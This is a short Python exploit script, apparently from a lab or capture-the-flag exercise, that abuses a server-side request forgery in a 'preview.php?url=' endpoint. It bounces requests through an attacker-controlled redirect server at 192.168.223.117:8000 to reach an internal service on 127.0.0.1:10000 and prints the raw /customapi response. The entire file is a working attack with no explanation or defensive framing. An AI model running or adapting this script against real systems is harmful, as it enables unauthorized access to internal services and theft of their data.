import requests, urllib.parse, re

attacker = 'http://192.168.223.117:8000'
base = 'http://10.82.159.192/preview.php?url='

def fetch(path):
    target = 'http://127.0.0.1:10000' + path
    redir = attacker + '/redirect?to=' + urllib.parse.quote(target, safe='')
    r = requests.get(base + urllib.parse.quote(redir, safe=''), timeout=10)
    return r.text

# Full raw dump of customapi
body = fetch('/customapi')
print('=== /customapi FULL ===')
print(body)
